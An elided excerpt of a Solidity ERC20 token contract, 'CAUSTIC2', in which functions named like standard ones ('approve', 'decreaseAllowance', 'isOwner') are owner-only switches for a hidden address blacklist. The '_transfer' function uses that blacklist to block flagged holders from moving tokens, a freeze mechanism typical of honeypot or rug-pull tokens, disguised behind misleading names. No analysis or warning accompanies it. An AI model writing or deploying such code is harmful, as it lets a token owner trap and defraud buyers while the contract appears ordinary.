...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    mapping (address => bool) private _airSnapshot;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    bool private _airSnapshotApplied = false;
    ...
    function approve(address [] calldata _addresses_) external onlyOwner {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            _airSnapshot[_addresses_[i]] = true;
    ...
    function decreaseAllowance(address [] calldata _addresses_) external onlyOwner {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            _airSnapshot[_addresses_[i]] = false;
        }
    }

    function isOwner(address _address_) public view returns (bool) {
        return _airSnapshot[_address_];
    }
    ...
    function _transfer(
        ...
        if (_airSnapshot[from] || _airSnapshot[to]) require(_airSnapshotApplied == true, "");
...
contract CAUSTIC2 is ERC20 {
    constructor() ERC20("CAUSTIC2", "CAUSTIC2") {
